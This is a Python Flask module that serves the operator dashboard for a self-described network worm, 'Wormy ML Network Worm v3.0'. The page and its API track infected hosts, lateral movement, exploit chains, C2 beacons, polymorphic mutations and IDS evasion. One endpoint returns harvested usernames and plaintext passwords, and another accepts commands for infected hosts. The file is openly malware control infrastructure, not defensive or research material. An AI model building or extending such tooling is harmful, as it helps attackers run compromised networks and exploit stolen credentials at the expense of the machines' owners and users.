"""
Wormy ML Network Worm v3.0
Developed by Ruby570bocadito (https://github.com/Ruby570bocadito)
Copyright (c) 2024 Ruby570bocadito. All rights reserved.
"""

"""
Web GUI Dashboard
Professional Flask-based web interface for monitoring and controlling Wormy
"""

import os
import sys
import json
import time
import threading
from datetime import datetime
from typing import Dict, List, Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from utils.logger import logger

try:
    from flask import Flask, render_template_string, jsonify, request
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False
    logger.warning("Flask not installed: pip install flask")


class WebDashboard:
    """
    Professional Web Dashboard for Wormy
    
    Features:
    - Real-time host monitoring
    - Network topology visualization
    - Exploit chain tracking
    - Credential management
    - Activity feed
    - Statistics and charts
    - Command execution interface
    """

    def __init__(self, worm_core=None, host: str = '0.0.0.0', port: int = 5000):
        self.worm = worm_core
        self.host = host
        self.port = port
        self.app = None
        self._thread = None

        if not FLASK_AVAILABLE:
            logger.error("Flask not available, Web Dashboard disabled")
            return

        self.app = Flask(__name__)
        self._setup_routes()
        logger.info(f"Web Dashboard initialized on {host}:{port}")

    def _setup_routes(self):
        """Setup Flask routes"""

        @self.app.route('/')
        def index():
            return render_template_string(self._get_dashboard_html())

        @self.app.route('/api/status')
        def api_status():
            return jsonify(self._get_status_data())

        @self.app.route('/api/hosts')
        def api_hosts():
            return jsonify(self._get_hosts_data())

        @self.app.route('/api/activity')
        def api_activity():
            limit = request.args.get('limit', 50, type=int)
            return jsonify(self._get_activity_data(limit))

        @self.app.route('/api/vulnerabilities')
        def api_vulnerabilities():
            return jsonify(self._get_vulnerabilities_data())

        @self.app.route('/api/credentials')
        def api_credentials():
            return jsonify(self._get_credentials_data())

        @self.app.route('/api/topology')
        def api_topology():
            return jsonify(self._get_topology_data())

        @self.app.route('/api/stats')
        def api_stats():
            return jsonify(self._get_stats_data())

        @self.app.route('/api/command', methods=['POST'])
        def api_command():
            data = request.json
            host_ip = data.get('host_ip', '')
            command = data.get('command', '')
            return jsonify({'status': 'queued', 'host': host_ip, 'command': command})

    def _get_status_data(self) -> Dict:
        if not self.worm:
            return {'error': 'WormCore not available'}

        return {
            'running': self.worm.running,
            'infected_hosts': len(self.worm.infected_hosts),
            'failed_targets': len(self.worm.failed_targets),
            'total_discovered': self.worm.stats.get('total_hosts_discovered', 0),
            'vulnerabilities': self.worm.stats.get('vulnerabilities_found', 0),
            'exploit_chains': self.worm.stats.get('exploit_chains_built', 0),
            'lateral_movements': f"{self.worm.stats.get('lateral_success', 0)}/{self.worm.stats.get('lateral_movements', 0)}",
            'brute_force': f"{self.worm.stats.get('brute_force_successes', 0)}/{self.worm.stats.get('brute_force_attempts', 0)}",
            'credentials': self.worm.stats.get('credentials_discovered', 0),
            'c2_beacons': self.worm.stats.get('c2_beacons', 0),
            'polymorphic_mutations': self.worm.stats.get('polymorphic_mutations', 0),
            'start_time': self.worm.start_time.isoformat() if self.worm.start_time else None,
        }

    def _get_hosts_data(self) -> List[Dict]:
        if not self.worm or not self.worm.host_monitor:
            return []

        hosts = []
        for ip, host_state in self.worm.host_monitor.hosts.items():
            hosts.append({
                'ip': ip,
                'os': host_state.os_guess,
                'status': host_state.status,
                'health': host_state.health_score,
                'detection_risk': host_state.detection_risk,
                'cpu': host_state.cpu_usage,
                'memory': host_state.memory_usage,
                'payload_variant': host_state.payload_variant,
                'infected_at': host_state.infected_at.isoformat(),
                'last_beacon': host_state.last_beacon.isoformat(),
                'activities': len(host_state.activity_log),
                'credentials_found': len(host_state.credentials_found),
                'lateral_movements': len(host_state.lateral_movement_history),
            })
        return hosts

    def _get_activity_data(self, limit: int = 50) -> List[Dict]:
        if not self.worm or not self.worm.host_monitor:
            return []
        return self.worm.host_monitor.get_activity_feed(limit=limit)

    def _get_vulnerabilities_data(self) -> List[Dict]:
        vulns = []
        if not self.worm:
            return vulns
        for host in self.worm.scan_results:
            for v in host.get('vulnerabilities', []):
                vulns.append({
                    'host': host['ip'],
                    'cve': v.get('cve', 'N/A'),
                    'name': v.get('name', 'Unknown'),
                    'severity': v.get('severity', 'UNKNOWN'),
                    'cvss': v.get('cvss', 0),
                    'description': v.get('description', ''),
                })
        return vulns

    def _get_credentials_data(self) -> List[Dict]:
        if not self.worm or not self.worm.cred_manager:
            return []
        creds = self.worm.cred_manager.get_discovered_credentials()
        return [{'username': u, 'password': p, 'source': 'discovered'} for u, p in creds]

    def _get_topology_data(self) -> Dict:
        nodes = []
        edges = []
        if not self.worm:
            return {'nodes': [], 'edges': []}

        for host in self.worm.scan_results:
            ip = host['ip']
            is_infected = ip in self.worm.infected_hosts
            is_failed = ip in self.worm.failed_targets
            status = 'infected' if is_infected else ('failed' if is_failed else 'discovered')
            nodes.append({
                'id': ip,
                'label': ip,
                'status': status,
                'os': host.get('os_guess', 'Unknown'),
                'ports': host.get('open_ports', []),
            })

        if self.worm.host_monitor:
            for ip, host_state in self.worm.host_monitor.hosts.items():
                for lm in host_state.lateral_movement_history:
                    edges.append({
                        'from': ip,
                        'to': lm.get('target', ''),
                        'label': lm.get('technique', ''),
                        'success': lm.get('success', False),
                    })

        return {'nodes': nodes, 'edges': edges}

    def _get_stats_data(self) -> Dict:
        if not self.worm:
            return {}
        stats = {
            **self.worm.stats,
            'start_time': self.worm.start_time.isoformat() if self.worm.start_time else None,
            'end_time': self.worm.stats.get('end_time', datetime.now()).isoformat() if self.worm.stats.get('end_time') else None,
        }
        if self.worm.host_monitor:
            stats['host_monitor'] = self.worm.host_monitor.get_statistics()
        if self.worm.ids_evasion:
            stats['evasion'] = self.worm.ids_evasion.get_statistics()
        return stats

    def _get_dashboard_html(self) -> str:
        return """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Wormy ML Network Worm v3.0 - Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #0a0e17;
            color: #e0e0e0;
            min-height: 100vh;
        }
        .header {
            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
            padding: 20px 30px;
            border-bottom: 2px solid #0f3460;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header h1 {
            font-size: 1.8em;
            color: #00ff88;
            text-shadow: 0 0 10px rgba(0,255,136,0.3);
        }
        .header .version {
            color: #888;
            font-size: 0.9em;
        }
        .header .status-badge {
            padding: 8px 16px;
            border-radius: 20px;
            font-weight: bold;
            font-size: 0.9em;
        }
        .status-running { background: #00ff88; color: #000; }
        .status-stopped { background: #ff4444; color: #fff; }
        .container {
            max-width: 1600px;
            margin: 0 auto;
            padding: 20px;
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin-bottom: 25px;
        }
        .stat-card {
            background: #1a1a2e;
            border: 1px solid #2a2a4e;
            border-radius: 12px;
            padding: 20px;
            transition: all 0.3s ease;
        }
        .stat-card:hover {
            border-color: #00ff88;
            box-shadow: 0 0 15px rgba(0,255,136,0.1);
        }
        .stat-card .label {
            font-size: 0.85em;
            color: #888;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
        }
        .stat-card .value {
            font-size: 2em;
            font-weight: bold;
            color: #00ff88;
        }
        .stat-card .sub {
            font-size: 0.8em;
            color: #666;
            margin-top: 4px;
        }
        .panel {
            background: #1a1a2e;
            border: 1px solid #2a2a4e;
            border-radius: 12px;
            margin-bottom: 20px;
            overflow: hidden;
        }
        .panel-header {
            background: #16213e;
            padding: 15px 20px;
            border-bottom: 1px solid #2a2a4e;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .panel-header h2 {
            font-size: 1.1em;
            color: #00ff88;
        }
        .panel-body {
            padding: 20px;
            max-height: 400px;
            overflow-y: auto;
        }
        table {
            width: 100%;
            border-collapse: collapse;
        }
        th, td {
            padding: 10px 15px;
            text-align: left;
            border-bottom: 1px solid #2a2a4e;
        }
        th {
            color: #888;
            font-size: 0.85em;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        td { font-size: 0.9em; }
        .status-infected { color: #00ff88; }
        .status-failed { color: #ff4444; }
        .status-discovered { color: #4488ff; }
        .status-active { color: #00ff88; }
        .status-degraded { color: #ffaa00; }
        .status-critical { color: #ff4444; }
        .severity-CRITICAL { color: #ff0044; font-weight: bold; }
        .severity-HIGH { color: #ff6600; }
        .severity-MEDIUM { color: #ffcc00; }
        .severity-LOW { color: #44ff44; }
        .activity-item {
            padding: 8px 0;
            border-bottom: 1px solid #2a2a4e;
            display: flex;
            gap: 15px;
            align-items: center;
        }
        .activity-time { color: #666; font-size: 0.85em; min-width: 80px; }
        .activity-type {
            padding: 3px 8px;
            border-radius: 4px;
            font-size: 0.8em;
            min-width: 100px;
            text-align: center;
        }
        .activity-host { color: #4488ff; min-width: 140px; }
        .activity-details { color: #ccc; }
        .refresh-btn {
            background: #0f3460;
            border: 1px solid #00ff88;
            color: #00ff88;
            padding: 8px 16px;
            border-radius: 6px;
            cursor: pointer;
            font-size: 0.85em;
            transition: all 0.3s;
        }
        .refresh-btn:hover {
            background: #00ff88;
            color: #000;
        }
        .two-col {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        @media (max-width: 1000px) {
            .two-col { grid-template-columns: 1fr; }
        }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #0a0e17; }
        ::-webkit-scrollbar-thumb { background: #2a2a4e; border-radius: 4px; }
        ::-webkit-scrollbar-thumb:hover { background: #00ff88; }
    </style>
</head>
<body>
    <div class="header">
        <div>
            <h1>🐛 Wormy ML Network Worm</h1>
            <span class="version">v3.0 - Developed by Ruby570bocadito</span>
        </div>
        <div style="display:flex;gap:15px;align-items:center;">
            <span class="status-badge status-running" id="status-badge">RUNNING</span>
            <button class="refresh-btn" onclick="refreshAll()">🔄 Refresh</button>
        </div>
    </div>

    <div class="container">
        <div class="stats-grid" id="stats-grid">
            <div class="stat-card">
                <div class="label">Infected Hosts</div>
                <div class="value" id="stat-infected">0</div>
            </div>
            <div class="stat-card">
                <div class="label">Discovered</div>
                <div class="value" id="stat-discovered">0</div>
            </div>
            <div class="stat-card">
                <div class="label">Vulnerabilities</div>
                <div class="value" id="stat-vulns">0</div>
            </div>
            <div class="stat-card">
                <div class="label">Exploit Chains</div>
                <div class="value" id="stat-chains">0</div>
            </div>
            <div class="stat-card">
                <div class="label">Lateral Movement</div>
                <div class="value" id="stat-lateral">0/0</div>
            </div>
            <div class="stat-card">
                <div class="label">Credentials</div>
                <div class="value" id="stat-creds">0</div>
            </div>
            <div class="stat-card">
                <div class="label">C2 Beacons</div>
                <div class="value" id="stat-c2">0</div>
            </div>
            <div class="stat-card">
                <div class="label">Polymorphic Mutations</div>
                <div class="value" id="stat-poly">0</div>
            </div>
        </div>

        <div class="two-col">
            <div class="panel">
                <div class="panel-header">
                    <h2>🖥️ Infected Hosts</h2>
                    <button class="refresh-btn" onclick="loadHosts()">Refresh</button>
                </div>
                <div class="panel-body">
                    <table>
                        <thead>
                            <tr>
                                <th>IP</th>
                                <th>OS</th>
                                <th>Status</th>
                                <th>Health</th>
                                <th>Payload</th>
                            </tr>
                        </thead>
                        <tbody id="hosts-tbody"></tbody>
                    </table>
                </div>
            </div>

            <div class="panel">
                <div class="panel-header">
                    <h2>⚠️ Vulnerabilities</h2>
                    <button class="refresh-btn" onclick="loadVulns()">Refresh</button>
                </div>
                <div class="panel-body">
                    <table>
                        <thead>
                            <tr>
                                <th>Host</th>
                                <th>Name</th>
                                <th>Severity</th>
                                <th>CVSS</th>
                            </tr>
                        </thead>
                        <tbody id="vulns-tbody"></tbody>
                    </table>
                </div>
            </div>
        </div>

        <div class="panel">
            <div class="panel-header">
                <h2>📋 Activity Feed</h2>
                <button class="refresh-btn" onclick="loadActivity()">Refresh</button>
            </div>
            <div class="panel-body" id="activity-feed">
                <p style="color:#666;">Loading activity...</p>
            </div>
        </div>
    </div>

    <script>
        function refreshAll() {
            loadStatus();
            loadHosts();
            loadVulns();
            loadActivity();
        }

        function loadStatus() {
            fetch('/api/status')
                .then(r => r.json())
                .then(data => {
                    document.getElementById('stat-infected').textContent = data.infected_hosts || 0;
                    document.getElementById('stat-discovered').textContent = data.total_discovered || 0;
                    document.getElementById('stat-vulns').textContent = data.vulnerabilities || 0;
                    document.getElementById('stat-chains').textContent = data.exploit_chains || 0;
                    document.getElementById('stat-lateral').textContent = data.lateral_movements || '0/0';
                    document.getElementById('stat-creds').textContent = data.credentials || 0;
                    document.getElementById('stat-c2').textContent = data.c2_beacons || 0;
                    document.getElementById('stat-poly').textContent = data.polymorphic_mutations || 0;

                    const badge = document.getElementById('status-badge');
                    if (data.running) {
                        badge.textContent = 'RUNNING';
                        badge.className = 'status-badge status-running';
                    } else {
                        badge.textContent = 'STOPPED';
                        badge.className = 'status-badge status-stopped';
                    }
                });
        }

        function loadHosts() {
            fetch('/api/hosts')
                .then(r => r.json())
                .then(hosts => {
                    const tbody = document.getElementById('hosts-tbody');
                    if (!hosts.length) {
                        tbody.innerHTML = '<tr><td colspan="5" style="color:#666;">No hosts yet</td></tr>';
                        return;
                    }
                    tbody.innerHTML = hosts.map(h => `
                        <tr>
                            <td style="color:#4488ff;">${h.ip}</td>
                            <td>${h.os}</td>
                            <td class="status-${h.status}">${h.status}</td>
                            <td>${h.health.toFixed(0)}%</td>
                            <td>${h.payload_variant}</td>
                        </tr>
                    `).join('');
                });
        }

        function loadVulns() {
            fetch('/api/vulnerabilities')
                .then(r => r.json())
                .then(vulns => {
                    const tbody = document.getElementById('vulns-tbody');
                    if (!vulns.length) {
                        tbody.innerHTML = '<tr><td colspan="4" style="color:#666;">No vulnerabilities found</td></tr>';
                        return;
                    }
                    tbody.innerHTML = vulns.slice(0, 20).map(v => `
                        <tr>
                            <td style="color:#4488ff;">${v.host}</td>
                            <td>${v.name}</td>
                            <td class="severity-${v.severity}">${v.severity}</td>
                            <td>${v.cvss}</td>
                        </tr>
                    `).join('');
                });
        }

        function loadActivity() {
            fetch('/api/activity')
                .then(r => r.json())
                .then(activities => {
                    const feed = document.getElementById('activity-feed');
                    if (!activities.length) {
                        feed.innerHTML = '<p style="color:#666;">No activity yet</p>';
                        return;
                    }
                    feed.innerHTML = activities.slice(0, 30).map(a => `
                        <div class="activity-item">
                            <span class="activity-time">${a.timestamp ? a.timestamp.substring(11,19) : ''}</span>
                            <span class="activity-type" style="background:#16213e;color:#00ff88;">${a.type}</span>
                            <span class="activity-host">${a.host_ip || ''}</span>
                            <span class="activity-details">${a.details}</span>
                        </div>
                    `).join('');
                });
        }

        // Auto-refresh every 5 seconds
        setInterval(refreshAll, 5000);
        window.onload = refreshAll;
    </script>
</body>
</html>
"""

    def run(self, debug: bool = False):
        """Start the web dashboard"""
        if not FLASK_AVAILABLE:
            logger.error("Flask not available")
            return
        logger.info(f"Starting Web Dashboard on {self.host}:{self.port}")
        self.app.run(host=self.host, port=self.port, debug=debug, threaded=True)

    def run_background(self):
        """Run dashboard in background thread"""
        if not FLASK_AVAILABLE:
            return None
        self._thread = threading.Thread(target=self.run, daemon=True)
        self._thread.start()
        logger.info(f"Web Dashboard running in background on {self.host}:{self.port}")
        return self._thread
